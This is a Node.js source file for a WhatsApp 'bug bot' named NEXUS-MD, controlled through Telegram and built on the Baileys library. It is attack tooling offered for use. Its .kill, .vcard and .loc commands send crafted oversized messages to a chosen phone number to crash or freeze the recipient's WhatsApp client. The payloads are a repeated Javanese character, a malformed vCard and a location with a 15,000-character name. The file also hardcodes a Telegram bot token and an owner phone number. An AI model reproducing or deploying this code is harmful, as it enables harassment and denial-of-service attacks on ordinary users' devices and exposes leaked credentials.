const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason, 
    delay 
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ CONFIGURATION ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8';
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD PRIVATE BUG",
    owner: "94767475809", // <--- මෙතනට ඔයාගේ WhatsApp නම්බර් එක විතරක් දාන්න
    prefix: ".",
    isPublic: false // දැන් මේක කාටවත් පාවිච්චි කරන්න බැහැ
};

// --- 🌐 WEB SERVER ---
app.get('/', (req, res) => res.send('Nexus Private Bug System is Online! ☠️'));
if (!global.serverStarted) {
    app.listen(PORT, () => console.log(`Dashboard on ${PORT}`));
    global.serverStarted = true;
}

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"], 
        printQRInTerminal: false
    });

    // --- 🤖 TELEGRAM PAIRING (ONLY FOR YOU) ---
    tgBot.on('message', async (msg) => {
        const text = msg.text;
        if (text === '/start') {
            return tgBot.sendMessage(msg.chat.id, `☠️ *NEXUS PRIVATE SYSTEM* ☠️\n\nඔබගේ අංකය එවන්න.`);
        }
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                let code = await sock.requestPairingCode(text.replace(/[^0-9]/g, ''));
                tgBot.sendMessage(msg.chat.id, `🔥 *CODE:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) { tgBot.sendMessage(msg.chat.id, "❌ Error!"); }
        }
    });

    // --- 📩 WHATSAPP PRIVATE BUG HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;

            const from = mek.key.remoteJid;
            const sender = mek.key.participant || mek.key.remoteJid;
            const isOwner = sender.includes(botConfig.owner) || mek.key.fromMe;
            
            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            const isCmd = body.startsWith(botConfig.prefix);
            const command = isCmd ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : "";
            const text = body.trim().split(/ +/).slice(1).join(" ");

            // --- 🛑 PRIVATE CHECK (ඔයාට විතරයි වැඩ කරන්නේ) ---
            if (isCmd && !isOwner) return; 

            if (isCmd) {
                switch (command) {
                    case 'menu':
                        const menu = `☠️ *NEXUS PRIVATE BUG* ☠️\n\n` +
                                   `🔥 *.vcard* [number]\n` +
                                   `💀 *.kill* [number]\n` +
                                   `❄️ *.freeze* [number]\n` +
                                   `📍 *.loc* [number]\n\n` +
                                   `_Status: Private Mode Active_`;
                        await sock.sendMessage(from, { text: menu }, { quoted: mek });
                        break;

                    case 'vcard':
                        if (!text) return;
                        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:Nexus Virus\n' + 'TEL;waid=' + text + ':+' + text + '\n' + 'END:VCARD'.repeat(100);
                        await sock.sendMessage(text + "@s.whatsapp.net", { contacts: { displayName: 'Nexus-MD', contacts: [{ vcard }] } });
                        await sock.sendMessage(from, { text: "✅ Sent!" });
                        break;

                    case 'kill':
                        if (!text) return;
                        const target = text + "@s.whatsapp.net";
                        for (let i = 0; i < 3; i++) {
                            await sock.sendMessage(target, { text: "☠️ CRASH ☠️\n" + "ꦿ".repeat(30000) });
                        }
                        await sock.sendMessage(from, { text: "💀 Target Destroyed!" });
                        break;

                    case 'loc':
                        if (!text) return;
                        await sock.sendMessage(text + "@s.whatsapp.net", { location: { degreesLatitude: 37, degreesLongitude: -122, name: "X".repeat(15000) } });
                        await sock.sendMessage(from, { text: "📍 Sent!" });
                        break;
                }
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'close') startNexus();
        else if (up.connection === 'open') console.log('PRIVATE BUG BOT READY!');
    });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
